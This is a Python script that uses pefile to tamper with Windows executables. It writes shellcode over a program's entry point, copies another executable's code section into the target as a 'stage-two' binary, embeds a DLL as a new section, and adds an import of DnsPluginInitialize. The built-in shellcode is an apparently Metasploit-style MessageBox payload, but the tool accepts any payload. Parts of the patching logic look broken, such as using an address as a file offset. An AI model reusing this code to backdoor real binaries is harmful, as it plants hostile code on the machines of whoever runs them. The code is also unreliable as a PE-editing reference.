from vendor import disitool
import sys
import pefile
import iced_x86
import struct
import os

def add_shellcode(pe: pefile.PE, output_path, provided_shellcode = None):
    # pe = pefile.PE(exe_path)

    shellcode = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9")
    shellcode += b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
    shellcode += b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
    shellcode += b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
    shellcode += b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
    shellcode += b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
    shellcode += b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
    shellcode += b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
    shellcode += b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
    shellcode += b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
    shellcode += b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
    shellcode += b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
    shellcode += b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
    shellcode += b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
    shellcode += b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
    shellcode += b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68"
    shellcode += b"\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c"
    shellcode += b"\x24\x0a\x89\xe3\x68\x58\x20\x20\x20\x68\x4d\x53\x46"
    shellcode += b"\x21\x68\x72\x6f\x6d\x20\x68\x6f\x2c\x20\x66\x68\x48"
    shellcode += b"\x65\x6c\x6c\x31\xc9\x88\x4c\x24\x10\x89\xe1\x31\xd2"
    shellcode += b"\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08"

    shellcode = provided_shellcode or shellcode

    print(shellcode)

    ep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    print("[*] Writting %d bytes at offset %s" % (len(shellcode), hex(ep)))
    pe.set_bytes_at_offset(ep, shellcode)

    pe.write(output_path)

def add_dll_import(exe_path, mock_dll_name, mock_functions, output_path):
    pe = pefile.PE(exe_path)
    
    # Calculate new Import Table RVA and size
    original_import_directory = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_IMPORT']]
    new_import_directory_rva = original_import_directory.VirtualAddress + original_import_directory.Size
    
    # Calculate the size of a new import descriptor
    import_descriptor_size = struct.calcsize('<LLLLL')
    
    # Create new import descriptor
    new_import_desc = struct.pack(
        '<LLLLL',
        new_import_directory_rva + import_descriptor_size + len(mock_dll_name) + 1,  # OriginalFirstThunk RVA
        0,  # TimeDateStamp
        0,  # ForwarderChain
        new_import_directory_rva + import_descriptor_size,  # Name RVA
        new_import_directory_rva + import_descriptor_size + len(mock_dll_name) + 1  # FirstThunk RVA
    )

    # Calculate the size of the new import section
    import_section_size = (len(mock_functions) + 2) * struct.calcsize('<I')  # Thunks and terminators
    import_section_size += len(mock_dll_name) + 1  # DLL name
    for func in mock_functions:
        import_section_size += len(func) + 1  # Function names

    # Align the new section to the next 4KB boundary
    new_section_offset = (pe.OPTIONAL_HEADER.SizeOfImage + 0xFFF) & 0xFFFFF000

    # Create new section header
    new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
    new_section.set_file_offset(pe.sections[-1].get_file_offset() + pe.sections[-1].sizeof())
    new_section.Name = b'.idata'
    new_section.Misc_VirtualSize = import_section_size
    new_section.VirtualAddress = new_section_offset
    new_section.SizeOfRawData = (import_section_size + 0x1FF) & 0xFFFFFE00  # Align to 512-byte boundary
    new_section.PointerToRawData = len(pe.__data__)
    new_section.PointerToRelocations = 0
    new_section.PointerToLinenumbers = 0
    new_section.NumberOfRelocations = 0
    new_section.NumberOfLinenumbers = 0
    new_section.Characteristics = 0x40000040  # Readable | Initialized Data

    # Add the new section to the PE file
    pe.sections.append(new_section)
    pe.FILE_HEADER.NumberOfSections += 1
    pe.OPTIONAL_HEADER.SizeOfImage = new_section.VirtualAddress + new_section.Misc_VirtualSize

    # Update the import directory
    pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_IMPORT']].VirtualAddress = new_section.VirtualAddress
    pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_IMPORT']].Size += import_descriptor_size

    # Write the modified EXE to the output path
    pe.write(output_path)

    # Append the new import data to the modified EXE
    with open(output_path, 'ab') as modified_exe:
        # Write the new import descriptor
        modified_exe.write(new_import_desc)
        
        # Write the DLL name
        modified_exe.write(mock_dll_name.encode('utf-8') + b'\x00')
        
        # Write the thunks and function names
        for func in mock_functions:
            thunk_rva = new_section.VirtualAddress + import_descriptor_size + len(mock_dll_name) + 1
            modified_exe.write(struct.pack('<I', thunk_rva + len(func) + 1))
            modified_exe.write(func.encode('utf-8') + b'\x00')
        
        # Write null terminators for the thunks
        modified_exe.write(struct.pack('<I', 0))
        modified_exe.write(struct.pack('<I', 0))

    print(f"Added mock import {mock_dll_name} with functions {mock_functions} to {exe_path} successfully.")


def add_dll_to_exe(exe_path, dll_path, output_path):
    # Load the EXE file
    pe = pefile.PE(exe_path)
    
    # Read the DLL file
    with open(dll_path, 'rb') as dll_file:
        dll_data = dll_file.read()

    # Determine the section where the DLL will be added
    dll_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
    dll_section.set_file_offset(pe.sections[-1].get_file_offset() + pe.sections[-1].sizeof())
    
    # Define the name, characteristics, and size of the new section
    dll_section.Name = b'.rsrc'  # Name of the section, .rsrc is the resources section
    dll_section.Misc = len(dll_data).to_bytes(4)
    dll_section.Misc_PhysicalAddress = 0
    dll_section.Misc_VirtualSize = len(dll_data)
    dll_section.VirtualAddress = (pe.sections[-1].VirtualAddress + 
                                  pe.sections[-1].Misc_VirtualSize + 
                                  0xFFF) & 0xFFFFF000  # Align to the next 4KB boundary
    dll_section.SizeOfRawData = (len(dll_data) + 0x1FF) & 0xFFFFFE00  # Align to the next 512-byte boundary
    dll_section.PointerToRawData = os.path.getsize(exe_path)
    dll_section.PointerToRelocations = 0
    dll_section.PointerToLinenumbers = 0
    dll_section.NumberOfRelocations = 0
    dll_section.NumberOfLinenumbers = 0
    dll_section.Characteristics = 0x40000040  # Readable | Initialized Data
    
    # Add the new section to the list of sections
    pe.sections.append(dll_section)
    
    # Adjust the PE header to account for the new section
    pe.FILE_HEADER.NumberOfSections += 1
    pe.OPTIONAL_HEADER.SizeOfImage = (dll_section.VirtualAddress + 
                                      dll_section.Misc_VirtualSize + 
                                      0xFFF) & 0xFFFFF000
    
    # Write the modified EXE to the output path
    pe.write(output_path)
    
    # Append the DLL data to the modified EXE
    with open(output_path, 'ab') as modified_exe:
        modified_exe.write(dll_data)
    
    print(f"Embedded {dll_path} into {exe_path} successfully.")


def add_shellcode_from_exe(pe: pefile.PE, shell_exe: pefile.PE):
    for section in shell_exe.sections:
        print(section.Name)
        if section.Name.startswith(b".text"):
            shellcode = section.get_data()
            add_shellcode(pe, "stage-two-tmp.exe", provided_shellcode=shellcode)

def main():
    exe = pefile.PE(sys.argv[1])

    print(exe.DIRECTORY_ENTRY_IMPORT)


    for entry in exe.DIRECTORY_ENTRY_IMPORT:
        print(entry.dll)
        for imp in entry.imports:
            print('\t', hex(imp.address), imp.name)

    add_shellcode_from_exe(pefile.PE(sys.argv[1]), pefile.PE(sys.argv[2]))

    # add_shellcode(sys.argv[1], "stage-one-tmp.exe")
    # add_dll_to_exe(sys.argv[1], sys.argv[2], "stage-one-tmp.exe")
    # add_dll_import("stage-one-tmp.exe", sys.argv[2], ["DnsPluginInitialize"], sys.argv[3])
    

if __name__ == "__main__":
    main()